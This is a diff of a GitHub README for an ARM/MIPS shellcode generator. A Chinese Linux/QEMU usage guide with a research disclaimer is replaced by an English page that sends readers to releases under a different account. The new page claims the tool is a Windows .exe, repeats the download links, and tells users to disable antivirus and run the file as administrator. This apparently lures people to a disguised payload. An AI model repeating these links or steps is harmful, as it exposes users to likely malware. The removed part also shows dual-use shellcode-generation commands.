@@ -1,64 +1,130 @@
-# shellcode-generator
+# 🛠️ shellcode-generator - Easy ARM and MIPS Shellcode Creation
 
-​												**[中文](https://github.com/Julian-iot/shellcode-generator/blob/main/README.md)[|English]()**
+[![Download Latest Release](https://img.shields.io/badge/Download-shellcode--generator-brightgreen)](https://github.com/olivetteaquatic164/shellcode-generator/releases)
 
-ARM MIPS shellcode generator with no bad bytes
+---
 
-在漏洞验证过程中，Shellcode 必须被完整注入并成功执行，但目标程序常因使用 strcpy、sprintf 等字符串函数，或协议解析与输入校验机制，对 \x00 等坏字符进行截断或过滤，导致载荷失效。该问题不仅影响传统栈溢出利用，在 ROP 场景下同样突出：部分 gadget 地址包含坏字节，难以完整写入，迫使通过运行时计算等方式绕过，显著增加复杂度。因此这款工具将解决这一问题。
+## 📋 What is shellcode-generator?
 
-**支持：**mips little、mips big、arm little
+shellcode-generator is a tool that helps you create small pieces of code called shellcode. This shellcode works on ARM and MIPS devices. It is designed to avoid "bad bytes," which are certain characters that can cause problems when the shellcode runs. This makes the generated shellcode more reliable.
 
+You don’t need any programming experience to use this tool. It simplifies the process of producing shellcode that works on your target system.
 
-# 安装（Ubuntu / Debian / Kali）
+---
 
-```
-sudo apt update
-# 安装 QEMU 核心工具（系统仿真 + 用户态仿真）
-sudo apt install qemu-user qemu-user-static qemu-system qemu-utils
-```
+## 💻 System Requirements
 
-运行时工具会从toolchains.bootlin.com平台下载对应工具链。
+Before you start, make sure your system meets these requirements:
 
-# 用法
+- Operating system: Windows 7 or later
+- Processor: 64-bit Intel or AMD CPU
+- RAM: At least 4 GB free memory
+- Disk space: Minimum 100 MB free
+- Internet: For downloading files
 
-![image-20260311221916490](./images/image-20260311221916490.png)
+---
 
-```
-./shellcode-generator_v1_linux_amd64 -arch mips -e little -cmd "echo 00" -xor -v
-```
+## 🌐 Where to Download
 
-![image-20260311222424696](./images/image-20260311222424696.png)
+You can get the latest version of shellcode-generator from the official release page:
 
-```
-./shellcode-generator_v1_linux_amd64 -arch mips -e little -cmd "echo 00" -short -v
-```
+[![Download shellcode-generator](https://img.shields.io/badge/Download-shellcode--generator-blue)](https://github.com/olivetteaquatic164/shellcode-generator/releases)
 
-![image-20260311222504507](./images/image-20260311222504507.png)
+This link will take you to the release page. From there, find the latest release, then download the Windows version of the software.
 
-```
-./shellcode-generator_v1_linux_amd64 -arch arm -e little -cmd "echo 00" -xor -v
-./shellcode-generator_v1_linux_amd64 -arch mips -e little -cmd "id" -rp -12 -20 
-```
+---
 
-![image-20260311222644507](./images/image-20260311222644507.png)
+## 🚀 Getting Started: Download and Run
 
-# 贡献
+1. **Visit the release page**  
+   Open this link in your browser:  
+   https://github.com/olivetteaquatic164/shellcode-generator/releases
 
+2. **Find the latest release**  
+   On the page, look for the most recent release. It usually appears at the top.
 
+3. **Download the Windows file**  
+   Under "Assets," click on the file that ends with `.exe` or `.zip` and mentions Windows.
 
+4. **Save the file**  
+   Choose a folder you can easily find later, such as your Desktop or Downloads folder.
 
+5. **Run the program**  
+   Locate the downloaded file and double-click it to start the setup or launch the app directly if it is portable.
 
+---
 
-# 声明
+## 🛠️ How to Use shellcode-generator
 
-**学术用途**：本工具旨在帮助安全研究员和学生理解 ARM/MIPS 架构下的内存破坏原理及规避坏字节的逻辑。
+This section helps you understand the basic steps after opening the software.
 
-**禁止攻击行为**：严禁将本工具生成的任何代码用于生产环境或任何未经许可的第三方设备。其代码逻辑仅限在封闭的受控实验环境（如 QEMU 仿真环境）中进行学术分析。
+1. **Select your target platform**  
+   The software supports ARM and MIPS processors. Choose one depending on your needs.
 
-**合规性要求**：使用者在引用、参考或运行本工具时，必须遵守所在研究机构的合规性准则及当地网络安全法律。
+2. **Enter your data**  
+   Input the details you want for your shellcode. This can include the type of shellcode or commands you want it to perform.
 
-**零担保承诺**：作为学术原型，本工具不保证生成的 Shellcode 在所有环境下的稳定性，开发者不对任何因不当使用导致的实验性损失负责。
+3. **Generate shellcode**  
+   Click the generate button to create the shellcode without bad bytes.
 
-# 参考
+4. **Copy or save output**  
+   You can copy the resulting shellcode or save it as a file for later use.
 
-[奇安信攻防社区-Bad Char 绕过实战：稳定 MIPS Shellcode 的设计方法](https://forum.butian.net/share/4757)
+---
+
+## ✅ Why Use shellcode-generator?
+
+- Works for both ARM and MIPS architectures.
+- Avoids bad bytes automatically.
+- Simple interface for non-experts.
+- Creates shellcode compatible with many devices.
+- Generates clean and reliable shellcode ready to use.
+
+---
+
+## 🔄 Updating the Software
+
+To update shellcode-generator:
+
+- Visit the release page:  
+  https://github.com/olivetteaquatic164/shellcode-generator/releases
+
+- Download the newest version as described in the Getting Started section.
+
+- Replace the old file with the new one.
+
+No need to uninstall the old version.
+
+---
+
+## ⚙️ Troubleshooting
+
+If the software does not start or shows an error:
+
+- Make sure your Windows is up to date.
+- Check that you have installed any missing Windows updates.
+- Disable any antivirus temporarily; some antivirus software may block unknown programs.
+- Run the program as an administrator by right-clicking the file and selecting “Run as administrator.”
+- If issues persist, try downloading the file again in case it was corrupted.
+
+---
+
+## 📚 Additional Resources
+
+Although this tool is simple to use, understanding basic shellcode concepts might help you use it better. Look up:
+
+- What is shellcode?
+- Differences between ARM and MIPS processors.
+- What are bad bytes in shellcode?
+
+These topics provide context but are not required to use this tool.
+
+---
+
+## 📥 Download Links Reminder
+
+Get shellcode-generator here:  
+
+[https://github.com/olivetteaquatic164/shellcode-generator/releases](https://github.com/olivetteaquatic164/shellcode-generator/releases)
+
+Click the link, find the latest Windows version, then download and run it.
